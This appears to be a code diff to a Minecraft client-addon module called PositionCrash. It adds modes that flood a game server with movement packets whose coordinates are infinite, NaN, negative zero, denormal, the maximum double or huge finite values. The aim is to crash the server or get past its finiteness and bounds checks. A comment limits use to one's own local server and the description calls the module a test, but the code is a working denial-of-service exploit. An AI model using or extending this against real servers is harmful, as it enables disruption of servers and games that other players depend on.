@@ -36,12 +36,14 @@ import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
  * Run against your OWN local server only.
  */
 public class PositionCrash extends Module {
-    public enum Mode { LARGE, HUGE, INFINITY }
+    public enum Mode { LARGE, HUGE, INFINITY, POS_INFINITY, NAN, NAN_Y_ONLY, NEGATIVE_ZERO, DENORMAL, MAX_DOUBLE }
 
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
 
     private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
-        .name("mode").defaultValue(Mode.LARGE).build()
+        .name("mode")
+        .description("LARGE/HUGE = extreme finite coords (chunk-load flood + speed cap, absorbs former extreme-velocity); INFINITY/POS_INFINITY/NAN/NAN_Y_ONLY = IEEE-754 injection; NEGATIVE_ZERO/DENORMAL/MAX_DOUBLE = finite-but-nasty values that pass a bare isFinite() check (absorbs former nan-position).")
+        .defaultValue(Mode.LARGE).build()
     );
     private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
         .name("amount").description("Packets to send.")
@@ -69,13 +71,13 @@ public class PositionCrash extends Module {
 
     public PositionCrash() {
         super(AddonTemplate.CRASH_CATEGORY, "position-crash",
-            "Floods position packets with large or infinite coordinates. Tests server movement bounds checking.");
+            "Floods position packets with extreme, infinite, NaN, or finite-but-nasty coordinates. Tests movement bounds + finiteness checking (absorbs extreme-velocity + nan-position).");
     }
 
     @Override
     public void onActivate() {
         ticksActive = 0; packetsSent = 0;
-        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
+        cadence.onActivate(); gr.onActivate(this); preStress.onActivate(this);
         if (!onTick.get()) {
             sendPackets();
             if (autoDisable.get()) toggle();
@@ -94,9 +96,15 @@ public class PositionCrash extends Module {
         for (int i = 0; i < amount.get(); i++) {
             double x = mc.player.getX(), y = mc.player.getY(), z = mc.player.getZ();
             PlayerMoveC2SPacket.PositionAndOnGround pkt = switch (mode.get()) {
-                case LARGE    -> new PlayerMoveC2SPacket.PositionAndOnGround(x + 9412.0 * i, y + 9412.0 * i, z + 9412.0 * i, true, false);
-                case HUGE     -> new PlayerMoveC2SPacket.PositionAndOnGround(x + 500000.0 * i, y + 500000.0 * i, z + 500000.0 * i, true, false);
-                case INFINITY -> new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true, false);
+                case LARGE        -> new PlayerMoveC2SPacket.PositionAndOnGround(x + 9412.0 * i, y + 9412.0 * i, z + 9412.0 * i, true, false);
+                case HUGE         -> new PlayerMoveC2SPacket.PositionAndOnGround(x + 500000.0 * i, y + 500000.0 * i, z + 500000.0 * i, true, false);
+                case INFINITY     -> new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true, false);
+                case POS_INFINITY -> new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true, false);
+                case NAN          -> new PlayerMoveC2SPacket.PositionAndOnGround(Double.NaN, Double.NaN, Double.NaN, true, false);
+                case NAN_Y_ONLY   -> new PlayerMoveC2SPacket.PositionAndOnGround(x, Double.NaN, z, true, false);
+                case NEGATIVE_ZERO-> new PlayerMoveC2SPacket.PositionAndOnGround(-0.0, -0.0, -0.0, true, false);
+                case DENORMAL     -> new PlayerMoveC2SPacket.PositionAndOnGround(Double.MIN_VALUE, Double.MIN_VALUE, Double.MIN_VALUE, true, false);
+                case MAX_DOUBLE   -> new PlayerMoveC2SPacket.PositionAndOnGround(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, true, false);
             };
             mc.player.networkHandler.sendPacket(pkt);
             packetsSent++;
